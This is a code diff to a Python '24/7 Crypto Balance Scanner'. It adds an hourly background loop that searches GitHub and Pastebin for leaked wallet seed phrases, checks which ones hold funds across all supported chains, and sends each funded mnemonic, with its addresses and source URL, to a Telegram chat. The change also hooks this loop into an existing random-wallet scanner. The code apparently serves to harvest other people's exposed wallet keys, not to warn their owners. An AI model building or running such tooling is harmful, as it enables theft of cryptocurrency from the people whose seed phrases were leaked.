@@ -92,6 +92,90 @@ def format_hit_alert(mnemonic: str, addresses: list, balances: list) -> str:
     return "\n".join(lines)
 
 
+async def run_leak_scanner_loop(interval: int = 3600) -> None:
+    """Run the leak scanner periodically (default: every hour).
+
+    Scans GitHub and Pastebin for leaked mnemonics, verifies balances,
+    and sends Telegram alerts on confirmed hits.
+    """
+    from src.modules.crypto.balance.leak_scanner import (
+        GitHubLeakScanner,
+        PasteSiteScanner,
+        verify_and_alert,
+    )
+    from src.modules.crypto.balance.chains import ALL_CHAINS
+    from src.modules.crypto.balance.hit_logger import HitLogger
+
+    github_token = os.environ.get("GITHUB_TOKEN", "")
+    hit_logger = HitLogger(
+        db_path="wallet_hits.db",
+        telegram_token=TELEGRAM_BOT_TOKEN,
+        telegram_chat_id=TELEGRAM_CHAT_ID,
+    )
+
+    github_scanner = GitHubLeakScanner(github_token=github_token, hit_logger=hit_logger)
+    paste_scanner = PasteSiteScanner(hit_logger=hit_logger)
+
+    logger.info("Leak scanner started (interval: %ds)", interval)
+
+    while True:
+        try:
+            logger.info("Leak scanner: starting scan cycle")
+
+            # GitHub scan
+            github_findings = await github_scanner.scan(max_results=30)
+            logger.info("Leak scanner: GitHub found %d candidates", len(github_findings))
+
+            for finding in github_findings:
+                result = await verify_and_alert(
+                    finding.mnemonic_candidate,
+                    chains=list(ALL_CHAINS),
+                    hit_logger=hit_logger,
+                )
+                if result and result.has_balance:
+                    msg = (
+                        "🔍 *LEAK SCANNER HIT (GitHub)!*\n\n"
+                        f"*Source:* {finding.source_url}\n"
+                        f"*Mnemonic:* `{finding.mnemonic_candidate}`\n\n"
+                    )
+                    for chain, details in result.balance_details.items():
+                        msg += f"*{chain}*: `{details['balance']:.8f}` {details['symbol']}\n"
+                        msg += f"  Address: `{details['address']}`\n"
+                    msg += f"\n⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
+                    await send_telegram_alert(msg)
+                    logger.info("Leak scanner: CONFIRMED HIT from GitHub!")
+
+            # Pastebin scan
+            paste_findings = await paste_scanner.scan(max_pastes=30)
+            logger.info("Leak scanner: Pastebin found %d candidates", len(paste_findings))
+
+            for finding in paste_findings:
+                result = await verify_and_alert(
+                    finding.mnemonic_candidate,
+                    chains=list(ALL_CHAINS),
+                    hit_logger=hit_logger,
+                )
+                if result and result.has_balance:
+                    msg = (
+                        "🔍 *LEAK SCANNER HIT (Pastebin)!*\n\n"
+                        f"*Source:* {finding.source_url}\n"
+                        f"*Mnemonic:* `{finding.mnemonic_candidate}`\n\n"
+                    )
+                    for chain, details in result.balance_details.items():
+                        msg += f"*{chain}*: `{details['balance']:.8f}` {details['symbol']}\n"
+                        msg += f"  Address: `{details['address']}`\n"
+                    msg += f"\n⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
+                    await send_telegram_alert(msg)
+                    logger.info("Leak scanner: CONFIRMED HIT from Pastebin!")
+
+            logger.info("Leak scanner: scan cycle complete, sleeping %ds", interval)
+
+        except Exception as e:
+            logger.error("Leak scanner error: %s", e)
+
+        await asyncio.sleep(interval)
+
+
 async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
     """Run the random scanner continuously with Telegram alerts on hits."""
     from src.modules.crypto.balance.scanner_engine import RandomScanner
@@ -101,11 +185,12 @@ async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
     logger.info("=" * 60)
     logger.info("  24/7 Crypto Balance Scanner Starting")
     logger.info("=" * 60)
-    logger.info(f"  Workers:   {workers}")
-    logger.info(f"  Chains:    {', '.join(c.symbol for c in ALL_CHAINS)}")
-    logger.info(f"  Duration:  {duration}s" if duration else "  Duration:  unlimited")
-    logger.info(f"  Telegram:  {'configured' if TELEGRAM_BOT_TOKEN else 'NOT configured'}")
-    logger.info(f"  Log file:  {LOG_FILE}")
+    logger.info(f"  Workers:      {workers}")
+    logger.info(f"  Chains:       {', '.join(c.symbol for c in ALL_CHAINS)}")
+    logger.info(f"  Duration:     {duration}s" if duration else "  Duration:     unlimited")
+    logger.info(f"  Leak Scanner: enabled (every 3600s)")
+    logger.info(f"  Telegram:     {'configured' if TELEGRAM_BOT_TOKEN else 'NOT configured'}")
+    logger.info(f"  Log file:     {LOG_FILE}")
     logger.info("=" * 60)
 
     # Send startup notification
@@ -113,6 +198,7 @@ async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
         "🚀 *Crypto Balance Scanner Started*\n\n"
         f"Workers: {workers}\n"
         f"Chains: {', '.join(c.symbol for c in ALL_CHAINS)}\n"
+        f"Leak Scanner: every 1h\n"
         f"Duration: {'unlimited' if duration else f'{duration}s'}"
     )
 
@@ -147,12 +233,22 @@ async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
 
     start_time = time.monotonic()
 
+    # Start leak scanner as background task
+    leak_task = asyncio.create_task(run_leak_scanner_loop(interval=3600))
+    logger.info("Leak scanner background task started")
+
     try:
         stats = await scanner.run(duration_sec=duration)
     except Exception as e:
         logger.error("Scanner crashed: %s", e)
         await send_telegram_alert(f"❌ *Scanner crashed:*\n`{e}`")
         raise
+    finally:
+        leak_task.cancel()
+        try:
+            await leak_task
+        except asyncio.CancelledError:
+            pass
 
     elapsed = time.monotonic() - start_time
     logger.info("=" * 60)
